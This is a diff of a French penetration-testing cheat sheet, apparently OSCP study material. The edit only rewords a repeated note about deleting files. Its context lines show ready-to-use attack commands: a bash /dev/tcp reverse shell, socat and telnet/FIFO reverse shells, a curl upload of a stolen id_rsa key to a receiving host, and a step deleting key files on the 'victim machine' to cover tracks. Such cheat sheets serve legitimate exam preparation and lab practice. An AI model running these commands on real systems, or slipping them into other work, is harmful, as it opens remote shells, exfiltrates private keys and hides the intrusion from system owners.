@@ -20,7 +20,7 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 
 ```
 
-<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
+<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>
 
 ```bash
 # Méthode de transfert de flux FIFO avec Netcat
@@ -151,7 +151,7 @@ socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
 
 ### Telnet
 
-<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
+<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>
 
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
@@ -724,7 +724,7 @@ curl -T /tmp/id_rsa http://<IP_RECEPTEUR>:8080/id_rsa
 
 ```
 
-<p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
+<p class="oscp-command-note">Supprimer les fichiers ciblés.</p>
 
 ```bash
 # Supprimer les fichiers clés de la machine victime pour éviter de laisser des fichiers sensibles.
